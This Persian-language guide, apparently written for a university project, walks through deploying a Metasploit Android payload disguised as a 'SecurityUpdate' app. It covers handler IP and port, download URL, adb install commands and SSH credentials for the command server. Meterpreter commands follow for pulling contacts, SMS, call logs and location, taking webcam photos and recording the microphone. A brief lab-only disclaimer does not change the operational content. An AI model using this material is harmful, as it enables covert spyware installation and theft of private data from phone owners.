# 📱 راهنمای نصب و تست APK حرفه‌ای

## ✅ فایل‌های آماده شده

### 1️⃣ APK امضا شده (توصیه می‌شود)
```
SecurityUpdate_Signed.apk (12KB)
MD5: bdf173fcf9339493fe0d60d76979a94c
وضعیت: امضا شده با jarsigner
```

### 2️⃣ APK های دیگر (بدون امضا)
- `SecurityUpdate_Pro.apk` (10KB)
- `SecurityUpdate_Professional.apk` (10KB)
- `SecurityUpdate.apk` (10KB)

---

## 🌐 تنظیمات شبکه

### سرور Railway (Metasploit Handler)
```
Static IP: 208.77.244.15
LPORT: 4444
Handler Status: ✅ Running in background
```

### سرور محلی (دانلود APK)
```
Local IP: 192.168.43.151
Port: 8000
Status: ✅ HTTP Server Active
```

---

## 📥 روش 1: دانلود از شبکه محلی

### مراحل:
1. **در موبایل شبیه‌سازی شده:**
   - اطمینان حاصل کن که در همان WiFi هستی (یا از USB tethering استفاده کن)
   - مرورگر را باز کن
   - به این آدرس برو:
     ```
     http://192.168.43.151:8000/SecurityUpdate_Signed.apk
     ```

2. **فعال‌سازی نصب از منابع ناشناخته:**
   - Settings → Security → Unknown Sources → Enable
   - یا در اندروید جدید: Settings → Apps → Special Access → Install Unknown Apps

3. **نصب APK:**
   - روی فایل دانلود شده کلیک کن
   - Install را بزن
   - دسترسی‌های درخواستی را قبول کن

---

## 📤 روش 2: انتقال با ADB (اگر USB دسترسی داری)

```bash
# بررسی اتصال موبایل
adb devices

# نصب APK
adb install -r /home/offsec/Documents/GitHub/metasploit-framework1/SecurityUpdate_Signed.apk

# اجرای اپلیکیشن
adb shell monkey -p com.metasploit.stage -c android.intent.category.LAUNCHER 1
```

---

## 📧 روش 3: انتقال با روش‌های دیگر

### گزینه‌های موجود:
- **Bluetooth:** ارسال فایل از Parrot به موبایل
- **Email:** ایمیل به خودت و دانلود در موبایل
- **Cloud Storage:** آپلود به Google Drive/Dropbox
- **USB Cable:** کپی مستقیم فایل

---

## 🎯 تست اتصال Meterpreter

### 1️⃣ اجرای اپلیکیشن در موبایل
```
- پیدا کردن اپ "MainActivity" یا "System Update"
- باز کردن اپلیکیشن (ممکنه صفحه خالی نشون بده)
- اپ باید در background فعال بمونه
```

### 2️⃣ بررسی session در سرور
```bash
# اتصال به Railway
ssh -p 55001 root@crossover.proxy.rlwy.net
Password: 8181

# بررسی session ها
msfconsole -q -x "sessions -l; exit"
```

### 3️⃣ اگر session برقرار شد:
```bash
msfconsole -q

# لیست session ها
sessions -l

# اتصال به session (مثلاً session 1)
sessions -i 1

# دستورات تست:
sysinfo              # اطلاعات سیستم
pwd                  # دایرکتوری جاری
ls                   # لیست فایل‌ها
```

---

## 🔧 عیب‌یابی (Troubleshooting)

### مشکل: APK نصب نمیشه
**راه حل:**
- Unknown Sources رو فعال کن
- اگر خطای "Parse Error" گرفتی، از APK امضا شده استفاده کن
- فضای کافی در حافظه داشته باش

### مشکل: Session برقرار نمیشه
**راه حل:**
```bash
# 1. بررسی handler در Railway
ssh -p 55001 root@crossover.proxy.rlwy.net
ps aux | grep msfconsole

# 2. راه‌اندازی مجدد handler
nohup msfconsole -q -r /root/android_handler.rc > /tmp/handler.log 2>&1 &

# 3. بررسی port 4444
netstat -tlnp | grep 4444
```

### مشکل: موبایل در شبکه دیگه است
**راه حل:**
- از Railway Static IP استفاده میکنیم: `208.77.244.15`
- اطمینان حاصل کن موبایل به اینترنت دسترسی داره
- Firewall رو چک کن

---

## 📊 دستورات Meterpreter مفید

### جمع‌آوری اطلاعات:
```bash
sysinfo                    # اطلاعات دستگاه
getuid                     # کاربر جاری
ifconfig                   # تنظیمات شبکه
netstat                    # اتصالات شبکه
ps                         # پروسس‌های در حال اجرا
```

### دسترسی به فایل‌ها:
```bash
pwd                        # دایرکتوری جاری
ls                         # لیست فایل‌ها
cd /sdcard                 # رفتن به کارت حافظه
download /sdcard/DCIM      # دانلود پوشه
upload file.txt /sdcard    # آپلود فایل
```

### دسترسی به اطلاعات حساس:
```bash
dump_contacts              # استخراج مخاطبین
dump_sms                   # استخراج پیام‌ها
dump_calllog               # لاگ تماس‌ها
geolocate                  # موقعیت جغرافیایی
```

### کنترل دوربین و صدا:
```bash
webcam_list                # لیست دوربین‌ها
webcam_snap                # عکس گرفتن
webcam_stream              # استریم ویدیو
record_mic                 # ضبط صدا
```

### کنترل دستگاه:
```bash
shell                      # دریافت shell
send_sms -d "number" -t "text"  # ارسال SMS
interval 30                # تغییر فاصله ping
migrate PID                # انتقال به پروسس دیگر
```

---

## 📸 مستندات پروژه

برای پروژه دانشگاهی، این موارد رو screenshot بگیر:

1. ✅ Handler در حال اجرا در Railway
2. ✅ APK نصب شده در موبایل
3. ✅ Session برقرار شده (`sessions -l`)
4. ✅ اطلاعات دستگاه (`sysinfo`)
5. ✅ لیست فایل‌ها (`ls /sdcard`)
6. ✅ مخاطبین (`dump_contacts`)
7. ✅ موقعیت جغرافیایی (`geolocate`)
8. ✅ عکس از دوربین (`webcam_snap`)

---

## ⚠️ هشدار امنیتی

این ابزار فقط برای اهداف آموزشی و تحقیقاتی طراحی شده است.

- ✅ استفاده در محیط آزمایشگاهی کنترل شده
- ✅ فقط روی دستگاه‌های متعلق به خودتان
- ❌ استفاده غیرمجاز روی دستگاه‌های دیگران غیرقانونی است
- ❌ نقض حریم خصوصی افراد جرم است

---

## 📞 پشتیبانی

در صورت بروز مشکل:

1. لاگ handler را بررسی کن:
   ```bash
   ssh -p 55001 root@crossover.proxy.rlwy.net
   tail -100 /tmp/handler.log
   ```

2. بررسی اتصال شبکه موبایل

3. راه‌اندازی مجدد handler و اپلیکیشن

---

**تاریخ ایجاد:** 22 نوامبر 2025  
**نسخه APK:** Signed Professional Edition  
**وضعیت:** ✅ آماده برای تست و استقرار
